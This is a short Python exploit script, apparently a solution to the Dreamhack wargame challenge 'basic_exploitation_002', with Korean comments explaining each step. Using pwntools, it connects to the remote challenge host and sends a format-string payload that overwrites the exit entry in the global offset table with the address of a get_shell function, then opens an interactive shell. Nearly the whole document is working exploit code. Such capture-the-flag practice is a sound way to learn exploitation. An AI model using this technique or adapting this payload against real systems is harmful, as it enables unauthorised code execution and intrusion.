from pwn import *

# p = process("./basic_exploitation_002")       
# 문제에서 주어진 basic_exploitation_002로 미리 local에서 실습을 하고자 하는 경우

p = remote("host1.dreamhack.games", 12549)
e = ELF("./basic_exploitation_002")
OFFSET = 1

# c언어 소스 코드에서 exit()함수가 작동하면서 프로그램이 종료될 때 get_shell() 함수를 실행시키도록 주소를 바꿔버린다.
exit_GOT = e.got['exit']
shell_ADDR = 0x08048609

# exit@GOT에 shell_ADDR을 offset=1 하여 넣는다.
payload = fmtstr_payload(1, {exit_GOT:shell_ADDR})

p.sendline(payload)

p.interactive()
